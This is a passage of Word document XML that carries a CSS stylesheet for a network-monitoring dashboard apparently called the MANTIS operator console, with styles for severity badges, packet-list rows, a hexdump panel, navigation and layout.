    <w:p w14:paraId="46A0CD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border-top: 3px solid var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EC8E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B2817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1EE8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Tables --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CB84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.table-card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B8F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6CD89F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4D7838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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181C27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hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2B9D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334B6D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573C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.table-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A5F3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16px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8574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7CCAAB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063443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rgba(0, 0, 0, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1523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C122FB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BE8A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table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E2A1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100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694A06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border-collapse: collapse;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E3A5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text-align: left;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5340FB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EF9AA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0A57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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BD6B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0BD69C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433B46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5405EA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12px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020A65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63E091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9325C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205A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td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604B3B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12px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412785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rgba(42, 46, 63, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242822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32BDC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577F5D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1EAC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tr:hover td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D010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rgba(255, 255, 255, 0.02);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560C10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7D7B5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57D2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.mono {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59239E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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468D7F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D518B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67F1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.badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAFF3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4px 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2084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4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798FC4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1B7658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26330F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0FD720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B07AA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31E5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.bg-CRITICAL {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152EFE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rgba(239, 68, 68, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F858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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40753C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rgba(239, 68, 68, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C908B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05746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29EB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.bg-HIGH {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764052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rgba(245, 158, 11, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB1B0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var(--accent-orange);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DAD0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rgba(245, 158, 11, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5075CE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27CE4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6123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.bg-SCAN {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A529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rgba(139, 92, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C353E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var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A70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rgba(139, 92, 246, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0E4A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24C4C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2CAD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.bg-INFO {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FA50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rgba(59, 130, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDC3D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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65203F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rgba(59, 130, 246, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21216E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A8DD6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5A63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Wireshark View Styles */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9BB2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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0C79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'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AB2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128E86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0BB6EB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92F8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.ws-TCP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5D1C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#a3e635;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050C65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79A1E9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9382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.ws-UDP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0EFD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#38bdf8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66171C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FAB66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8D1C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.ws-ICMP {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797F0D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#f472b6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A45B7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FAB0B1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D697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.ws-MALICIOUS {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468A70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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481A61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rgba(239, 68, 68, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371C4B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386E7E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7B1E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.ws-OTHER {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035673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#94a3b8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269CBC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5FD01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1CED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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDC2B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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8F6F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CBC54F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1400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.wireshark-row.selected td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5CD7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rgba(59, 130, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C70C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D348C4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F5B7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Packet viewer toolbar */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449E44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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BAE7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4B3D76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flex-wrap: wrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEC2B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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7253E7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17F39B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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AAD5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FD593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8708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input[type="text"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6C99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select {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23383E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3FB6E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border: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BD3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277BC3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8px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520FCF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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4388AB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6D2746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'Inter', sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C4CA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699EF6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8277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input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A32E3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240px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D61AF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79340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0D75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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5D2D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63966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1BF946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45027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8px 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A61F8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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B845A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4F8CA4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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6194FA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2B5043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text-decoration: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414BF3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inline-flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C4C7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2D1BC0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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB9C2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D560C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3877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.pkt-btn:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564FC4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var(--bg-card-hover);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D23E0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46010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57CA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.pkt-btn.paused {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FAF5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rgba(239, 68, 68, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A448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rgba(239, 68, 68, 0.4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7B74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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643742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712150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BE09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.pkt-chip {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54892B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'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4CEC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7B1C91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120019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8E904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4BCD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.pkt-chip b {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1546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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043FD1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F5442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7911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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A5FE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'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2999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12.5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72ED20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1.5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E163C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#cbd5e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06118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16px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4A1D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3862F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white-space: pre;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E547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overflow-x: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EE5E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#0b0d13;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709DA7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B38439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85DA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.verdict-MALICIOUS {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721D9C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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FC4A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0DC6C5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DA2B4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005C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.verdict-BLACKLIST {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FC61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var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3B14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148645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E30D1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DDD6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Document/Project View */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266F39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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FE78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max-width: 800px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246AA0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1.6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A8F1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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514E71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#cbd5e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4961F1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padding-bottom: 40px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7DC7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D5D780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D2EF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h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783044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6EC3F1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6E027E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padding-bottom: 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C634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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE03E2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BCF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h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1669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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E6E9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24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A8B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dashed var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BC23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padding-bottom: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A24D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292B0F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9ADF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.arch-engine {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007267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rgba(0, 0, 0, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE9F8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border-left: 3px solid var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEA9A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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2F35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16px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A233C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0 8px 8px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C930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56575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64B4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--- Charts --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325A5A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.chart-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F44A1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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FEA8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60px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42980C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100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3090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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08144D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DEEC3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D3C8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/* MANTIS operator console */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D063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:root {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238C98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--bg-main: #f1f4f3;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B2DB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--bg-nav: #0d1a20;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9CC6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--bg-card: #ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C892A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--bg-card-hover: #f7faf9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5526A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--text-main: #142229;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470D9D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--text-muted: #68777d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706FC0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--accent-green: #16836f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A47F5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--accent-blue: #266d84;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059FF1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--accent-red: #b83b49;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640A3C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--accent-orange: #ad6a12;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C772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--accent-purple: #675a91;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3988F8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--border-color: #dbe3e1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C26E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--nav-text: #a6b4b9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0857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--nav-active: #ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670A51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--shadow-sm: 0 1px 2px rgba(13, 26, 32, 0.05);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EC74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735892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DA9F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* {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D31CC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box-sizing: border-box;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8B81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4F258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3219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html {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0BFE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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50318B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7CE93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FD21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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEF1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Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0BC7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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E97C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1C6129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320px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569165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2DF61C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B78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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11786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248px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525079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flex: 0 0 248px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74432F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var(--bg-nav);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507272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border-right: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5194F2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8px 0 24px rgba(13, 26, 32, 0.04);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1725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4FC24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2324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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173A07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76px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284DDE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18px 22px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E54BD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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E880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rgba(255, 255, 255, 0.08);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299446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866E8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EDB3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.brand-mark {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFF61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36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635E4F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36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342708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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588CE1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rgba(116, 216, 193, 0.38);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC240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50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2E0D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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D755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place-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57012E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color: #ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635500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monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0BFE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1A3717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4E8DA1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-0.02em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6967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#126b60;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BC9D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inset 0 0 0 4px #0f554f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E34B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8CFA1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7E2B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.brand-mark::after {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5355EB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content: "";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2225C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4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0A4F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4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9AA5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position: absolute;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DB1B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right: 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BDF1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top: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE0FB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50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2926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#8be0c9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB85D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0 0 0 2px rgba(139, 224, 201, 0.16);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD536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0AAC4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31E4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.logo-container h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F18C2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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F0F9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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAC2C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0.08em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E21DA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3C5E9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8AAD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.logo-subtitle {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75266B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3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E06B1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#87949f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DFA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3BD036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3DB7F7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0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559FFA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565F8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01A2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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCA5F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24px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B8C2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605F66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CAAE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.nav-label {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638AB4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0 12px 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4011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#687680;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F012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6C0710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661BE3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0.12em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F7A3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754558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063E04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A025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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BCA6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100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743ED5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42px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298330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2px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E58C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10px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094DFD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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10142F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7169E5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069D88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var(--nav-text);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647CF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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289053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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D202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inherit;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC4A5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14FB3D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0583A5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text-align: left;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2665C2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transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E7CB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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F68F0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7D3E9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B9B7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 svg {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABD74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17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411B34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17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAAA7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flex: 0 0 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEAD1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stroke-width: 1.7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078039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D3C4FB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CBB0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.nav-item:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2E75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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234CB3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rgba(255, 255, 255, 0.06);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509528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54427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ACBE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.nav-item.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582591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var(--nav-active);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3445B1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#1a2b32;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B6DE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border-left-color: transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32718A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inset 3px 0 #38a08f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CE47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C95DB3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087C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.nav-item:focus-visible {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8C67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outline: 2px solid #70c8b5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717AC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outline-offset: 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E212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A0C4A7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912C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.sidebar-session {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4073FE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auto 16px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE8B6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15px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A241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#98a8ae;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C530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rgba(255, 255, 255, 0.08);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD10C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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE344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7BC783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rgba(255, 255, 255, 0.02);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301409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BAED2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D951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.session-heading {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4822C9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79A6C7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0E4DC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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5821D2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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A14C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#e0e8e9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1118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39E049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6C6AE9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0.08em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9CCF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06D57B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6F373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B403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.session-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EA9D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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA09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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A81A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50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF147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#56bca5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224093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0 0 0 3px rgba(86, 188, 165, 0.12);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226EED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4A5BF0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9DEB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.session-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0668E7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019679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space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BF9D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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F90A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7px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1337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border-top: 1px solid rgba(255, 255, 255, 0.06);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42389F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15C14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7FBE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.session-row strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C947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#f1f5f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD81D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monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFCBD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570E45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597DA5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4401C2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8561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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0321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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051782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1EBE6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E757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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23026A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76px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBAC5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14px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4501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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484EEC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16DDEB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A95E9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2FE1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.header-status {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF79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63B294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54F1A7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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B192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83E2F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AC90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.last-updated {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3CE0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#7b888d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3987B1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monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B302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5F6F17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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EF43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CEEC75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622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.header-copy h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A25C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13D002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2DEFD4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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B0A6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font-weight: 650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EB9C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-0.01em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D601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1135B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BC38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.header-copy p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D50B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4px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7924EC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1892E8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56E517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DC3561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CA09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.status-badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CE90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7px 11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8BB0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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FB81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#f1f8f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A08E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#cfe5dd;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7890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999px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B489D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Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC1C3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63861E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2B3A14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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2EBA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1BFE63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F0A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.pulse-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7064FD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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6058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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242483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animation: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C66F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2C013F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CAA7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.tab-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02941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26px 30px 36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0677EE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scrollbar-color: #bcc6cd transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42054C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scrollbar-width: thin;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60638D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63D16A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9A00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.content-width {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1A71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100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7488DE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max-width: 1500px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CFC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 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD010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819D04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5899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.section-heading {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0F1F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323F5A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flex-end;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4383EB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space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DBB1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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2542B0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 0 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A89EE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88047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3AE4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.section-heading h2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4F8D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.section-heading h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79057E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62DA16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63AB9F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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0791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1F5E9A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B669F0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EF3A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.section-heading p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AF25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4px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48315E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28FD6E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1D971C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93A9B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61FD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.refresh-note {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1249D3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#7a8791;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354D8D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7B44A5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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139468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F7C354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13C9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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6121E5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grid-template-columns: repeat(4, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C79FF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14px;</w:t>
      </w:r>
    </w:p>
